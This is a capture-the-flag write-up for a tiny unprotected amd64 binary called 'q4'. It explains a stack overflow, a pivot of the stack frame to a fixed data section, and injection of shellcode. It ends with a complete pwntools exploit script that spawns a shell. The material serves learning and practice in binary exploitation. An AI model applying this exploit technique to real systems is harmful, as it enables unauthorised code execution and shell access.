# 2 small 2 pwn

> I just read and write , Can you still Pwn me ?
>
> Service is running at nc 68.183.158.95 8992
>
> [q4](q4)

The given tiny binary has no security mechanisms enabled, there is only ASLR we have to bypass.

		$ checksec q4
	    Arch:     amd64-64-little
	    RELRO:    No RELRO
	    Stack:    No canary found
	    NX:       NX disabled
	    PIE:      No PIE (0x400000)
	    RWX:      Has RWX segments

Since it is statically linked, we can not ret-2-libc and since it does not contain enough gadgets to build a ROP chain that spawns a shell, we have to inject our own shellcode.

The binary lets us read 160 bytes onto the stack into a 16 bytes buffer, so we can easily overflow it and get execution. Since NX is disabled, we have RWX segments and could directly place shellcode on the stack, but we would have to find a reliable way to get the address of the stack due to ASLR. Luckily there is a data section at a fixed position that we could use instead to place our shellcode.

The exploit overwrites in the first stage the `RBP` with the address of the data section and overwrites the `RIP` to the address of the `main` function to recursively call it again, but leaving out the first instructions that modify the `RBP`. 

Since the `RBP` now points to the data section, we have moved the stack frame to an address we know and the read call will now store our next input there, so we can overflow the buffer again and overwrite the `RIP` to point to the beginning of our shellcode followed by the shellcode.

Exploit code:

```python
from pwn import *

main = 0x4000c7
msg = 0x6000ec

context.clear(arch='amd64')
shellcode = asm(shellcraft.sh())

pty = process.PTY
p = process('./q4', stdin=pty, stdout=pty)
# context.terminal = ['termite', '-e']
# p = gdb.debug('./q4', stdin=pty, stdout=pty)

p.sendline('A' * 16 + p64(msg) + p64(main))
p.sendline('A' * 24 + p64(msg+0x10) + shellcode)
p.interactive()
```